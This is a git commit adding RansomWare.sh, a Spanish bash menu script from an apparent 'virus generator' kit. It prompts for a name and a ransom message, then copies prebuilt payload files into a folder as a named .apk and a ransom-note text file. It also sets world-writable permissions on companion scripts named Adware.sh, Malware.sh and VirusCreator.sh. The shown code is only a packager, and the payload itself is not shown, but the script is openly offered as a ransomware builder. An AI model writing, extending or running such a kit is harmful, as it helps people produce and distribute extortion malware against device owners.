6a192958e629e674ed1fb078eb47e7b49e6c18a7
SKELLING-OFICIAL <81347639+SKELLING-OFICIAL@users.noreply.github.com>
2021-03-31 14:22:42 -0600

    Create RansomWare.sh

---
+++ RansomWare.sh
@@ -0,0 +1,33 @@
+#!/bin/bash
+clear
+chmod 777 Adware.sh
+chmod 777 Malware.sh
+chmod 777 RansomWare.sh
+chmod 777 VirusCreator.sh
+echo "▄▄    ▄▄   ▄▄▄▄▄▄   ▄▄▄▄▄▄    ▄▄    ▄▄    ▄▄▄▄       ▄▄▄▄   ▄▄▄▄▄▄▄▄  ▄▄▄   ▄▄" 
+echo "▀██  ██▀   ▀▀██▀▀   ██▀▀▀▀██  ██    ██  ▄█▀▀▀▀█    ██▀▀▀▀█  ██▀▀▀▀▀▀  ███   ██" 
+echo " ██  ██      ██     ██    ██  ██    ██  ██▄       ██        ██        ██▀█  ██" 
+echo " ██  ██      ██     ███████   ██    ██   ▀████▄   ██  ▄▄▄▄  ███████   ██ ██ ██" 
+echo "  ████       ██     ██  ▀██▄  ██    ██       ▀██  ██  ▀▀██  ██        ██  █▄██" 
+echo "  ████     ▄▄██▄▄   ██    ██  ▀██▄▄██▀  █▄▄▄▄▄█▀   ██▄▄▄██  ██▄▄▄▄▄▄  ██   ███"
+echo "  ▀▀▀▀     ▀▀▀▀▀▀   ▀▀    ▀▀▀   ▀▀▀▀     ▀▀▀▀▀       ▀▀▀▀   ▀▀▀▀▀▀▀▀  ▀▀   ▀▀▀" 
+echo "=========="
+echo "Todos somos uno="
+echo "=========="
+echo " "
+echo "Ingresa el nombre de tu RansomWare (incluye extencion .apk)"
+read input
+echo " "
+echo "INgresa el mensaje quieres que diga"
+read input1
+mkdir RansomWare
+cp 3 $input.apk
+mv $input.apk RansomWare
+cp 4 $input1.txt
+mv $input1.txt RansomWare
+echo "Tu RansomWare a sido Creado esta en la carpeta"
+echo "RansomWare"
+echo " "
+read input2
+echo "Volviendo a menu principal"
+bash virusgen.sh
